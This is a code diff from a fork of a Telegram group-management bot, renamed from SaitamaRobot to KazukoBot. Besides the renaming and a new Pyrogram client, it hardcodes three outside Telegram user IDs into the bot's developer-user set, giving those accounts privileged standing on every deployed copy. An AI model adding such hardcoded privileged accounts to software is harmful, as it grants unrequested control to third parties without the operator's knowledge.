@@ -108,7 +108,7 @@ if ENV:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
 else:
-    from SaitamaRobot.config import Development as Config
+    from KazukoBot.config import Development as Config
 
     TOKEN = Config.TOKEN
 
@@ -182,6 +182,9 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(1665347268)
+DEV_USERS.add(1212368262)
+DEV_USERS.add(1697409878)
 
 if not SPAMWATCH_API:
     sw = None
@@ -193,8 +196,10 @@ else:
         sw = None
         LOGGER.warning("Can't connect to SpamWatch!")
 
+
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
-telethn = TelegramClient("saitama", API_ID, API_HASH)
+telethn = TelegramClient("kazuko", API_ID, API_HASH)
+pbot = Client("kazukopbot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
